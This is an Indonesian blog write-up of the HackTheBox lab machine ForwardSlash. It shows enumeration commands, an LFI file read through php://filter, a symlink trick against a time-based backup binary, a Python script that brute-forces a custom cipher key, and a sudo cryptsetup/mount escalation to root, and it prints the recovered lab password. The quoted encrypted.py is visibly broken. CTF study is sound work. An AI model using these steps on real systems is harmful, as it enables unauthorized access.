---
layout: posts
title:  "ForwardSlash"
dates:   July 2020
tag:	hackthebox
categories: hackthebox
image: ""
author: "OREOSEC"
---

**Bismillah..**

Sebagai informasi mesin ini bernama Forward Slash dengan OS linux dengan total 40 points (hard). Adapun seperti biasanya, tantangan dari HackThebox adalah mengambil alih akses penuh mesin (privilege escalation) untuk mendapatkan user.txt dan root.txt


Intro
-----


Box yang relatif tidak terlalu susah (mungkin karna saya beruntung wkwkwk). Perjalanan Forwardslash dimulai dengan mencari file. Lalu menambahkan subdomain, dan kemudian bypass lfi pada bagian client-side dan filter. Mendapat file yang memiliki kredensial untuk pengguna. File tersebut dimiliki oleh pengguna. Login ssh ke mesin dan enum menggunakan lse, melakukan timestamp dan pada file config.php.bak dengan timestamp itu kami mendapat user credential. Mendapatkan key setelah menganalisis python script. User dapat me-mount gambar dengan hak istimewa root dan karenanya kami mendapat password ssh pribadi dari root pengguna. 
Recon

This Content
-----

*   [Nmap port scanning](#nmap)
*   [Enum web server](#gobuster)
*   [LFI](#lfi)
*   [Gaining user](#user)
*   [Gaining root](#gaining-root)

### Nmap Scan {#nmap}

```bash 
nmap -sCV -oN nmap/serv <ip>
```
![alt nmap](/assets/img/forwardslash/nmap.png)

### Enum web server {#gobuster}

Disini kita hanya akan mendapatkan 2 service saja yaitu ssh dan http (simple, dan ini yang saya suka XD)
Langsung saja kita cek pada bagian http 

![alt web index](/assets/img/forwardslash/web.png)

Hanya sebuah tampilan web korban deface, karna tidak mendapat apa apa maka langsung enum pada bagian directory 

![alt gobuster](/assets/img/forwardslash/note-txt.png)

Kita mendapat sebuah catatan note.txt yang isinya: 
>Pain, we were hacked by some skids that call themselves the "Backslash Gang"... I know... That name... 
Anyway I am just leaving this note here to say that we still have that backup site so we should be fine.
-chiv


Disitu tertulis bahwa mereka masih memiliki backup pada backup site ( walaupun baru sadar setelah melakukan fuzz vhost ) maka langsung saja kita tambahkan subdomain pada /etc/hosts backup.forwardslash.htb
Setelah membuka subdomain tersebut.. kita akan langsung disuguhkan dengan halaman login.. 

![alt subdomain login page](/assets/img/forwardslash/login.png)

setelah mencoba kredensial kramat (admin:admin, dst) tidak bisa, maka saya putuskan untuk enum pada bagian directory lagi

```bash
gobuster dir -u http://backup.forwardslash.htb/ -w /usr/share/dirb/wordlists/common.txt -t 50 -x php,html,txt -o gobuster/backup
```

![alt gobuster backup file](/assets/img/forwardslash/gobuster.png)

Disitu terlihat ada register page maka langsung menuju bagian situ, sebenarnya saya mencoba berkeliling ke beberapa page semisal dev,api, dsb. (access denied), jadi langsung saja register lalu login dengan akun yang sama. 

![alt welcome page](/assets/img/forwardslash/welcome.png)

kita akan mendapatkan page yang menarik disini yaitu pada bagian change profile picture 

![alt change pfp](/assets/img/forwardslash/profile-picture.png)

Disini kita lihat form-nya di-disable kita bisa inspect element, sebenarnya sudah sangat jelas kalau ini memiliki kerentanan LFI. Selanjutnya kita akan menggunakan burp suite untuk mengeksekusinya 

### LFI {#lfi}

![alt burpsuite](/assets/img/forwardslash/burp-etcpasswd.png)

Ternyata benar LFI :D. Karna disini kita tidak bisa melakukan RCE melalui LFI maka saya berasumsi untuk mengecek pada page2 yang sudah kita dapatkan tadi (dev, api, dsb) 

![alt burpsuite denied](/assets/img/forwardslash/burp-dec-denied.png)

disitu tertulis permission denied.. masih sama seperti awalnya.. maka saya membuka [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter)

![alt burpsuite wrapper](/assets/img/forwardslash/burp-wrapper.png)

### Gaining user {#user}

setelah di decode dengan base64

![alt source code dev/index.php](/assets/img/forwardslash/cred-chiv.png)

kita mendapatkan credential untuk login ssh
Sebenarnya pada bagian user ini saya mendapatkan keberuntungan.. yaitu saya mendapatkan script yang tergeletak pada bagian home directory wkwkwkkw... setelah di eksekusi maka langsung muncul apa yang kita harapkan, yaitu user yang terdapat user.txt file-nya (mungkin ini yang bikin box ini gak jadi masalah buat saya) tapi disini saya akan menjelaskan caranya

kita akan menggunakan LSE untuk enum

![alt LSE](/assets/img/forwardslash/lse-backup.png)

terdapat file yang menarik yaitu backup.. kita coba jalankan

```bash
chiv@forwardslash:/var/www/backup.forwardslash.htb$ backup
----------------------------------------------------------------------
	Pains Next-Gen Time Based Backup Viewer
	v0.1
	NOTE: not reading the right file yet, 
	only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 11:56:51
ERROR: d99c2c7f8fe2c01787f88e9974e4f1fa Does Not Exist or Is Not Accessible By Me, Exiting...
```			

Setiap kali kita menjalankan script ini, kita mendapatkan MD5Sum baru dan jika kita crack md5 pada bagian error-nya maka hanya akan menampilkan waktu.. Jadi pemikirannya di sini adalah bahwa jika kita memberinya file backup ini dengan MD5 yang sesuai, kita dapat 'mendekripsi' backup tersebut. kita perlu mendapatkan MD5 saat ini dan menautkannya ke file target

```bash
t="$(date +%H:%M:%S | tr -d '\n' | md5sum | tr -d ' -')"
ln -s /var/backups/config.php.bak /home/chiv/$t
backup
```				

Rincian singkat: Baris pertama adalah memberikan tanggal / waktu saat ini dan Jumlah MD5. Selanjutnya kita menautkan target config.php.bak ke variabel waktu itu. Lalu kami memanggil backup tool. setelah dijalankan maka kita akan mendapat password dari pain 

![alt shell](/assets/img/forwardslash/pain-pass.png)

### Gaining root {#root}

sekarang kita bisa login ke user pain

```bash
sudo -l
```
```bash
Matching Defaults entries for pain on forwardslash:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pain may run the following commands on forwardslash:
(root) NOPASSWD: /sbin/cryptsetup luksOpen *
(root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
(root) NOPASSWD: /bin/umount ./mnt/
```

lalu saya coba membuka recovery image.. tapi ternyata membutuhkan password untuk membukanya 

![alt trying open recovery](/assets/img/forwardslash/wrong-passw.png)

terdapat file pada home encrypted.py
```python
def encrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in key:
        for i in range(len(msg)):
            if i == 0:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[-1])
            else:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[i-1])

            while tmp > 255:
                tmp -= 256
            msg[i] = chr(tmp)
    return ''.join(msg)

def decrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in reversed(key):
        for i in reversed(range(len(msg))):
            if i == 0:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))
            else:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))
                tmp += 256
            while tmp < 0:
            msg[i] = chr(tmp)
    return ''.join(msg)


print encrypt('REDACTED', 'REDACTED')
print decrypt('REDACTED', encrypt('REDACTED', 'REDACTED'))
```				

dengan melakukan sedikit scripting untuk bruteforce

```python
def decrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in reversed(key):
        for i in reversed(range(len(msg))):
            if i == 0:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))
            else: 
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))
            while tmp < 0:
                tmp += 256
            msg[i] = chr(tmp)
    return ''.join(msg)

with open ('./ciphertext', 'r') as f:
    a = f.read()
    for i in range(1, 165):
        for j in range(33, 127):
            key = chr(j) * i
            msg = decrypt(key, a)
            if 'the' in msg:
                print(msg)
                exit()
					
```

maaf kalo scriptnya agak berantakan wkwkwkw
kita akan mendapatkan passwordnya: `cB!6%sdH8Lj^@Y*$C2cf`
langsung saja kita buka file image nya, lalu mount ke mnt

```bash
sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup
sudo /bin/mount /dev/mapper/backup ./mnt/
```

![alt](/assets/img/forwardslash/id_rsa.png)

dan ternyata kita pun mendapatkan ssh private key dari si root ini. kita hanya tinggal login melalui ssh dan mengambil root.txt 